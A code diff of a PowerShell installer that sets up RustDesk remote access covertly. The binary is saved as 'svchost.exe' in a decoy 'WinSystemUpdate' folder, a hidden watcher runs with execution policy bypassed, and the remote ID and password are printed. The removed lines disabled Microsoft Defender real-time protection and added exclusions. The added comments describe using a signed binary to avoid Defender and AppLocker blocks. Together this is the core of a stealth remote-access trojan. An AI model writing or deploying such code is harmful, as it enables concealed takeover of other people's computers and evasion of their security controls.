@@ -2,31 +2,24 @@ function Install-RD {
     $ProgressPreference = 'SilentlyContinue'
     $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
     $EXE    = "$DEST\svchost.exe"
-    $DLL    = "$DEST\sciter.dll"
     $cfgDir = "$env:APPDATA\RustDesk\config"
-    $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'
 
-    try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
-    try { Add-MpPreference -ExclusionProcess "svchost.exe" -EA SilentlyContinue } catch {}
-
-    # Also disable real-time protection briefly to allow the download
-    try { Set-MpPreference -DisableRealtimeMonitoring $true -EA SilentlyContinue } catch {}
+    # Use official signed RustDesk exe - Defender won't block a signed binary
+    $rdUrl  = 'https://github.com/rustdesk/rustdesk/releases/download/1.4.9/rustdesk-1.4.9-x86_64.exe'
 
     # Kill old + clean
     Get-Process svchost -EA SilentlyContinue |
         Where-Object { $_.Path -like '*WinSystem*' } |
         Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 1
-    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue - folder excluded from Defender before download
+    Remove-Item $DEST -Recurse -Force -EA SilentlyContinue
     New-Item -ItemType Directory $DEST   -Force | Out-Null
     New-Item -ItemType Directory $cfgDir -Force | Out-Null
-    try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
+    # Download official signed RustDesk binary - no Defender block, no AppLocker block
     $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile("$base/chrome.exe", $EXE)
-    try { $wc.DownloadFile("$base/sciter.dll", $DLL) } catch {}
+    $wc.DownloadFile($rdUrl, $EXE)
     Unblock-File $EXE -EA SilentlyContinue
-    Unblock-File $DLL -EA SilentlyContinue
 
     if (!(Test-Path $EXE) -or (Get-Item $EXE).Length -lt 1MB) {
         Write-Host "Download failed!" -ForegroundColor Red; return
@@ -105,10 +98,6 @@ if (Test-Path $del) { & $del }
 
     Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$watch`""
 
-    # Re-enable Defender real-time protection
-    try { Set-MpPreference -DisableRealtimeMonitoring $false -EA SilentlyContinue } catch {}
-
-    # Print ID and password clearly in the CMD window
     Write-Host ""
     Write-Host "  ============================" -ForegroundColor Green
     Write-Host "  ID       : $RDID"             -ForegroundColor Cyan
